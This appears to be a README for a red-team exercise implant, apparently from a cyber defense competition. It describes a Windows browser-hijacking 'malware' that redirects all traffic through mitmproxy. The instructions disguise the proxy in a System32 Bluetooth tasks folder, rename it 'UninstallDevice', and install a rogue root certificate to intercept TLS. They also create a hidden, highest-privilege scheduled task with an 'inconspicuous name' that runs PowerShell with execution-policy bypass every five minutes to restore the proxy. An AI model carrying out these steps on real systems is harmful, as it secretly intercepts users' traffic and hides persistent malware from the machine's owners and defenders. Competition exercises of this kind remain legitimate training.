## Description
Going to any URL in the browser redirects to nuccdc.club. The browser goes through a proxy (mitmproxy), which redirects all requests. The script that runs mitmproxy and ensures the proxy is on runs as a scheduled task on startup, login, and every 5 minutes. 

## Dependencies
UninstallDeviceService
PackageManagementFunctions.ps1

## How to Build
### Install mitmproxy
1. Install mitmproxy from https://mitmproxy.org/ by clicking `download Windows Installer`. You may need to click the three dots on the download and specify `Keep` -> `Show more` -> `Keep Anyway`
2. Go through the mitmproxy setup wizard. Set the Installation Directory as: C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\ 
3. Go to C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\ and delete `logo.ico`, `uninstall.dat`, and `uninstall`. Move `mitmproxy` and the folder `_internal` from C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\bin to C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\ 
4. Rename `mitmproxy` to `UninstallDevice`

### Install certificate
1. In settings, go to Network & Internet -> Proxy and click `Edit` under `Use a proxy server`. Toggle `on` and set the Proxy IP address to `127.0.0.1` and the Port to `8080`. Click `Save`
2. Open Powershell, go to C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\ , and run `.\UninstallDevice.exe`
3. Open Microsoft Edge and go to `mitm.it`. Click `Get mitmproxy-ca-cert.p12` for Windows and follow the instructions under `Show Instructions` to install the certificate
4. Delete the certificate installation files afterwards

### Place dependencies
1. Place `UninstallDeviceService` in C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\
2. Place `PackageManagementFunctions.ps1` in  C:\Program Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\

### Create task
1. Open `Task Scheduler`, click `Action` and `Create Task`. Give it an inconspicuous name like `PackageManagement`. Click `Run whether user is logged on or not` and `Run with highest privileges`. Click `hidden` and configure for `Windows 10`
2. Go to the Triggers tab and click `New`. Click `daily` and Click `repeat task every` and set it to `5 minutes` for a duration of `indefinitely`. Click `ok`. Again, click `New` and select Begin the task `at log on` and click `ok`. Again, click ‘New’ and select Begin the task `at startup` and click `ok`
3. Go to the Actions tab and click `New`. In program/script enter: C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe . In add arguments enter: -ExecutionPolicy Bypass -File “C:\Program Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\PackageManagementFunctions.ps1”
4. In the Conditions tab, make sure nothing is checked 
5. In the Settings tab, check `Allow task to be run on demand`, `Run task as soon as possible after a scheduled start is missed` and `if the task fails, restart every`. If the task is already running, then the following rule applies: set this to `Stop the existing instance`. Click `Ok`


The malware should now be running. Even if one goes to turn off the proxy, it will turn back on in 5 minutes. It will be dead if the scheduled task we created (named ‘PackageManagement’ in this example) is disabled/ deleted.













